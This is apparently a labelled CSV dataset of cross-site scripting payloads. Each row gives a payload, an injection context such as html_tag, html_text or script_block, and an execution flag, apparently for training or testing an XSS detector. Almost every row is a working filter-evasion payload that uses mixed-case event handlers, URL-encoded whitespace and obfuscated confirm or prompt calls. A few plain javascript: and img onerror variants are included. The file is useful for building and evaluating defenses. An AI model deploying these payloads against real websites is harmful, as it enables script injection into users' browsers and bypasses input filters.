payload,context,exec,combined
<d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s
<HTMl/+/ONMousEOVeR%09=%09(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl/+/ONMousEOVeR%09=%09(confirm)()>
<D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s
<d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s
"<d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s"
<HtML%0dOnMouSEoVER%09=%09[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%0dOnMouSEoVER%09=%09[8].find(confirm)>
<deTaiLS/+/OnpOINtEreNteR%09=%09(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTaiLS/+/OnpOINtEreNteR%09=%09(prompt)``>
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
<A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s
<hTMl/+/ONMOUSEOver+=+(prompt)``//,script_block,0,CTX_script_block CTX_script_block CTX_script_block <hTMl/+/ONMOUSEOver+=+(prompt)``//
<detAILS%09OntOGGLe%0d=%0dconfirm()>,script_block,0,CTX_script_block CTX_script_block CTX_script_block <detAILS%09OntOGGLe%0d=%0dconfirm()>
javascript:alert(1),url_navigation,1,CTX_url_navigation CTX_url_navigation CTX_url_navigation javascript:alert(1)
<a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<D3v%0doNmOUSeoveR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNmOUSeoveR%0d=%0dconfirm()%0dx>v3dm0s
<DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>
<D3V/+/ONPoinTerenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONPoinTerenTEr%09=%09confirm()%0dx>v3dm0s
<d3V%0aoNMoUsEOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aoNMoUsEOver+=+[8].find(confirm)%0dx>v3dm0s
<D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s
"<HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//"
<DeTails%09ONToGGlE%09=%09[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTails%09ONToGGlE%09=%09[8].find(confirm)>
"<D3V%0aonpOINTEreNTEr%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%0aonpOINTEreNTEr%09=%09a=prompt,a()%0dx>v3dm0s"
"<D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s"
<DEtAILs/+/onTogGLE%0a=%0a(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAILs/+/onTogGLE%0a=%0a(confirm)()%0dx>
"<DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DETaiLs%0dONtOGGLE%09=%09a=prompt,a()%0dx>"
<dEtailS%0donTogglE+=+confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtailS%0donTogglE+=+confirm()%0dx//
<DETaILS/+/oNtoGGle%0a=%0a(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETaILS/+/oNtoGGle%0a=%0a(prompt)``//
<htML/+/OnmOUSEOVer%09=%09confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/OnmOUSEOVer%09=%09confirm()>
<DeTaILS/+/oNPoInTerENteR%09=%09(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTaILS/+/oNPoInTerENteR%09=%09(confirm)()//
<a%0donMoUSeOVer+=+[8].find(confirm)>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donMoUSeOVer+=+[8].find(confirm)>v3dm0s
"<a%0aONmousEOver%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0aONmousEOver%0d=%0da=prompt,a()%0dx>v3dm0s"
<a/+/oNmoUSeovER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/oNmoUSeovER%09=%09confirm()>v3dm0s
<DEtAilS%0donpoinTeRenTeR%0a=%0a[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAilS%0donpoinTeRenTeR%0a=%0a[8].find(confirm)>
<A%0dONmouseoveR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dONmouseoveR%0a=%0a(confirm)()%0dx>v3dm0s
<D3V%0aONMOUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aONMOUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
<HTML/+/onMOuSeOver%0d=%0d(prompt)``>,url_navigation,0,CTX_url_navigation CTX_url_navigation CTX_url_navigation <HTML/+/onMOuSeOver%0d=%0d(prompt)``>
"<A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s"
<D3V%09OnmOuSeOvER%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09OnmOuSeOvER%0a=%0aconfirm()%0dx>v3dm0s
<detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//
<a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s
<htML/+/OnMOusEOvER%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/OnMOusEOvER%0d=%0d(confirm)()%0dx>
<A%09onPOINtEReNter%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09onPOINtEReNter%09=%09confirm()%0dx>v3dm0s
<d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/OnpointerEnTer%0d=%0d(confirm)()>v3dm0s
[test],html_text,0,CTX_html_text CTX_html_text CTX_html_text [test]
<DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>
"<a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s"
<A%09OnPOINtEreNtEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnPOINtEreNtEr%0d=%0d(confirm)()>v3dm0s
<d3v%0dONMOUSeOvER%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dONMOUSeOvER%0d=%0dconfirm()>v3dm0s
"<a%0dONMOUSeOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0dONMOUSeOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
`;alert(1);//,html_text,0,CTX_html_text CTX_html_text CTX_html_text `;alert(1);//
<deTAilS%09oNpOinteReNTeR%09=%09confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAilS%09oNpOinteReNTeR%09=%09confirm()>
<html%09oNPOintErENtER%0d=%0d(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%09oNPOintErENtER%0d=%0d(confirm)()%0dx>
"<DETaIlS%0aontOgglE+=+a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DETaIlS%0aontOgglE+=+a=prompt,a()//"
<A%09oNmouSeoVER+=+(confirm)()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09oNmouSeoVER+=+(confirm)()>v3dm0s
"<d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s"
<DEtaILs%0dONToGGlE%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtaILs%0dONToGGlE%09=%09confirm()%0dx//
<A%0doNPointEREnTER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0doNPointEREnTER%0d=%0d[8].find(confirm)%0dx>v3dm0s
""";alert(navigator.userAgent);//",script_block,1,"CTX_script_block CTX_script_block CTX_script_block "";alert(navigator.userAgent);//"
<hTmL%0dOnPoINtErenTer%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL%0dOnPoINtErenTer%0d=%0dconfirm()%0dx//
<dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>
<d3V/+/ONMOUsEoVer%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/ONMOUsEoVer%09=%09confirm()%0dx>v3dm0s
<A%09oNpoiNTEReNtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNpoiNTEReNtEr%0d=%0d[8].find(confirm)>v3dm0s
<hTmL%0dOnPoINtErenTer%0d=%0dconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL%0dOnPoINtErenTer%0d=%0dconfirm()%0dx//
"<hTML/+/oNMouSEoVER%0a=%0aa=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <hTML/+/oNMouSEoVER%0a=%0aa=prompt,a()>"
"<HTML/+/OnPOinTEREnTeR%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTML/+/OnPOinTEREnTeR%09=%09a=prompt,a()>"
<DeTails%09ONToGGlE%09=%09[8].find(confirm)>,url_href,0,CTX_url_href CTX_url_href CTX_url_href <DeTails%09ONToGGlE%09=%09[8].find(confirm)>
<dEtAILs/+/OnToGgLE+=+confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAILs/+/OnToGgLE+=+confirm()%0dx>
<d3V%0dONPoINteRENTer%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dONPoINteRENTer%0a=%0a(confirm)()%0dx>v3dm0s
<d3v%0aonpOiNterEnteR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aonpOiNterEnteR%0a=%0a(prompt)``%0dx>v3dm0s
""";alert(history.length);//",script_block,1,"CTX_script_block CTX_script_block CTX_script_block "";alert(history.length);//"
<DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>
<detaILs%0dontOGgLe+=+(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detaILs%0dontOGgLe+=+(prompt)``>
<deTaIls%0doNPoINtErenter+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaIls%0doNPoINtErenter+=+confirm()>
<d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s
<htML/+/ONPOinTeRENtEr%09=%09(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML/+/ONPOinTeRENtEr%09=%09(prompt)``%0dx//
<a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s
<a%0aOnmOUseoVEr%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnmOUseoVEr%0a=%0a(prompt)``>v3dm0s
"<A/+/oNmoUSEOVER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNmoUSEOVER%0d=%0da=prompt,a()>v3dm0s"
<DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//
<d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s
<A%0aOnmOusEoVER%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnmOusEoVER%09=%09(confirm)()>v3dm0s
<d3v%0aONpoiNtErenteR+=+[8].find(confirm)>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <d3v%0aONpoiNtErenteR+=+[8].find(confirm)>v3dm0s
<D3v%0dONmousEOveR%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dONmousEOveR%09=%09(confirm)()>v3dm0s
<deTaIlS%0aONToggle%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaIlS%0aONToggle%09=%09(prompt)``%0dx>
<DetaIls%0aONtoggLE%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetaIls%0aONtoggLE%0d=%0dconfirm()%0dx//
"<A%0donPOinTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0donPOinTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s
"<D3V%0aONpoiNtERENTer%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aONpoiNtERENTer%0d=%0da=prompt,a()>v3dm0s"
<A%0aonmOUseover%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonmOUseover%0a=%0a[8].find(confirm)>v3dm0s
<hTMl%09ONPOiNTereNTeR%0d=%0d(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%09ONPOiNTereNTeR%0d=%0d(prompt)``//
<D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s
<A%09OnPoInterenter%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnPoInterenter%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3V%0aOnPOinTerenter%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aOnPOinTerenter%09=%09(confirm)()%0dx>v3dm0s
<a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnPOINteRenTEr%0a=%0aconfirm()>v3dm0s
<d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s
<dETAILs/+/ONpoInTEReNTer+=+confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAILs/+/ONpoInTEReNTer+=+confirm()%0dx//
<A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s
<A%0aOnmOusEoVER%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnmOusEoVER%09=%09(confirm)()>v3dm0s
<A%0aonPoIntEreNTeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonPoIntEreNTeR%0a=%0a(prompt)``%0dx>v3dm0s
<DETaILS/+/oNtoGGle%0a=%0a(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaILS/+/oNtoGGle%0a=%0a(prompt)``//
<d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/onmouSEOveR%09=%09(prompt)``>v3dm0s
"<DetaILS%0aoNPoiNteREnter%0a=%0aa=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DetaILS%0aoNPoiNteREnter%0a=%0aa=prompt,a()>"
<hTMl%0doNmoUSeoVer+=+(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0doNmoUSeoVer+=+(prompt)``%0dx//
<A%09OnPoinTEREntER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnPoinTEREntER%09=%09confirm()>v3dm0s
<D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s
<A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09onPoInTeRenTeR%0a=%0a(confirm)()>v3dm0s
<D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s
<deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>
"<dETAils%0dontOGGle%09=%09a=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dETAils%0dontOGGle%09=%09a=prompt,a()//"
<dETaIls%0aoNToggLe%0d=%0dconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaIls%0aoNToggLe%0d=%0dconfirm()>
<DEtaiLs%09ONPOINTeRENTER+=+confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtaiLs%09ONPOINTeRENTER+=+confirm()%0dx//
<a/+/OnMOUSeoVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnMOUSeoVEr%0d=%0d(confirm)()>v3dm0s
<d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s
<img src=x onerror=alert(document.URL)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <img src=x onerror=alert(document.URL)>
<dEtAIls%0dONtOgglE+=+(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAIls%0dONtOgglE+=+(confirm)()%0dx>
<HtmL%09OnPOiNTerENTEr+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%09OnPOiNTerENTEr+=+confirm()>
<htML/+/oNpOintErEnter%09=%09confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htML/+/oNpOintErEnter%09=%09confirm()%0dx//
<a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s
<HtMl%09ONMOuseOver%0a=%0a[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtMl%09ONMOuseOver%0a=%0a[8].find(confirm)%0dx//
"<HTML%0doNmoUseOvER%0d=%0da=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0doNmoUseOvER%0d=%0da=prompt,a()%0dx//"
"<D3V%0aONpoiNtERENTer%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%0aONpoiNtERENTer%0d=%0da=prompt,a()>v3dm0s"
"<d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s"
<d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s
<D3v%0aOnpoiNTerENTer%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnpoiNTerENTer%0d=%0d(confirm)()%0dx>v3dm0s
